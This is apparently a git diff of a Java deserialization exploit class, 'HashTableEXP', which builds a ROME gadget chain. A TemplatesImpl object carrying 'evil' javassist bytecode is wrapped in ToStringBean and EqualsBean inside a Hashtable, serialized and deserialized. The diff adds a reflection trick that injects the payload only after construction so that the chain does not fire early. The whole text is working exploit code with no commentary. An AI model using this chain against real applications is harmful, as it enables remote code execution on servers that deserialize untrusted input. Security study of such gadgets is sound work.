@@ -7,7 +7,9 @@ import com.sun.syndication.feed.impl.ToStringBean;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtConstructor;
+import org.apache.commons.collections4.functors.ConstantTransformer;
 
+import javax.xml.transform.Templates;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.util.HashMap;
@@ -25,12 +27,17 @@ public class HashTableEXP {
         byte[][] codes = {evil};
         byteCodesField.set(templates,codes);
 //        templates.newTransformer();
-        ToStringBean toStringBean = new ToStringBean(c,templates);
+        ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1));
 //        toStringBean.toString();
         Class toStringBeanEvil = toStringBean.getClass();
         EqualsBean equalsBean = new EqualsBean(toStringBeanEvil,toStringBean);
         Hashtable hashtable= new Hashtable();
         hashtable.put(equalsBean,"Drunkbaby");
+
+        Field field = toStringBean.getClass().getDeclaredField("_obj");
+        field.setAccessible(true);
+        field.set(toStringBean,templates);
+
         serialize(hashtable);
         unserialize("ser.bin");
 
